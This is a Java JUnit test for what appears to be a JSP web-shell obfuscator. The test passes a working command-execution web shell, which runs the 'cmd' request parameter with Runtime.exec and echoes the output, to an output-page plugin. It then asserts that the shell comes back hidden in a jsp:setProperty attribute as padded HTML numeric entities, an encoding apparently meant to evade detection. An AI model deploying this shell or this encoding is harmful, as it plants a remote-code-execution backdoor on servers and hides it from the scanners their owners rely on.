package com.t3stzer0.jspobfuscator.plugins.extensions.OutputPage;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContextAdapter;
import com.t3stzer0.jspobfuscator.plugins.common.impl.page.DefaultJspxPage;
import com.t3stzer0.jspobfuscator.plugins.common.utils.random.RandomGenerator;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class SetPropertyOutputPageTest {

  @Test
  void testSetPropertyOutputPage() {
    List<String> code =
        List.of(
"""
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
byte[] b = new byte[2048];
while(in.read(b)!=-1)
    out.write(new String(b));
""");
    List<String> imports = List.of("java.io.*");

    SetPropertyOutputPage ext = new SetPropertyOutputPage();
    ExtensionContextAdapter ctx = new ExtensionContextAdapter();
    DefaultJspxPage page = new DefaultJspxPage(imports, List.of(), code);
    byte[] output = ext.outputPage(ctx, page);
    String expected =
"""
<?xml version="1.0" encoding="UTF-8" ?>
<jsp xmlns:jsp="http://java.sun.com/JSP/Page" >
<jsp:directive.page import="java.io.*" />
<jsp:setProperty name='&#00000000106;&#97;&#x0000076;&#x00000000061;&#00120;&#00000046;&#000000115;&#x00000065;&#x00072;&#x76;&#000000108;&#000101;&#x74;&#x00000002e;&#106;&#115;&#0000000112;&#0046;&#000106;&#000000000115;&#x00070;&#0000079;&#0000000117;&#x000000074;&#00034;&#0000000041;&#44;&#x00020;&#0114;&#x000000065;&#x0071;&#0000117;&#x0000000065;&#00000115;&#116;&#00041;&#00059;&#x000000a;&#x000006a;&#x61;&#x00076;&#000000097;&#00000000046;&#x0000000069;&#x00000006f;&#x0002e;&#00000000073;&#x0000000006e;&#000000112;&#x75;&#00116;&#x00053;&#x00000000074;&#00000114;&#000000101;&#000000097;&#0109;&#00000032;&#000000105;&#000000110;&#0000000032;&#0061;&#0032;&#00082;&#x0075;&#x000000006e;&#x0074;&#x0000069;&#x00000006d;&#000101;&#x02e;&#x000067;&#00000000101;&#0000000116;&#82;&#0117;&#0110;&#x74;&#x0069;&#x00006d;&#101;&#0000040;&#x29;&#00000000046;&#0000101;&#x078;&#000000101;&#x0063;&#00000000040;&#x00000072;&#x65;&#0000113;&#000000117;&#x0065;&#x0000000073;&#000000116;&#x0000002e;&#000000000103;&#x00065;&#000000000116;&#0000000080;&#x00000000061;&#x0072;&#x000061;&#109;&#00000000101;&#0000116;&#x00000000065;&#000114;&#x0000028;&#034;&#00099;&#000000109;&#x000064;&#x0000022;&#x0000000029;&#x00000029;&#000000046;&#000103;&#x00000065;&#x074;&#0000000073;&#x06e;&#x70;&#000117;&#x074;&#00083;&#000000000116;&#x0000072;&#x0000000065;&#x61;&#0000109;&#x0000028;&#x00000000029;&#x00003b;&#x00000000a;&#98;&#000000121;&#000116;&#x000000065;&#0091;&#x5d;&#x00000000020;&#0000098;&#x20;&#00000000061;&#000000032;&#000110;&#x065;&#x000000077;&#x000020;&#x62;&#x00079;&#x00000074;&#00000101;&#x00005b;&#00050;&#0000048;&#0000052;&#x000000038;&#000093;&#0000000059;&#00000000010;&#000000119;&#x0000000068;&#0105;&#000000108;&#0000000101;&#x028;&#x00000000069;&#0000000110;&#046;&#00114;&#x00000000065;&#000097;&#0100;&#40;&#00000098;&#x000000029;&#x00021;&#61;&#00000045;&#x0000031;&#00000041;&#0000010;&#0000000032;&#x0020;&#x00000000020;&#x0000020;&#x006f;&#00117;&#00116;&#x002e;&#x0000077;&#x0072;&#00000000105;&#x0000074;&#0000000101;&#x0028;&#x0006e;&#0000000101;&#x0000000077;&#x0000000020;&#83;&#x74;&#0000000114;&#x0000000069;&#00000000110;&#000103;&#00000000040;&#00098;&#x000029;&#x000000029;&#x00003b;&#000010;&#010;&#00000047;&#00000000047;' property="*" />
</jsp>
""";
    assertEquals(expected, new String(output, StandardCharsets.UTF_8));
  }
}
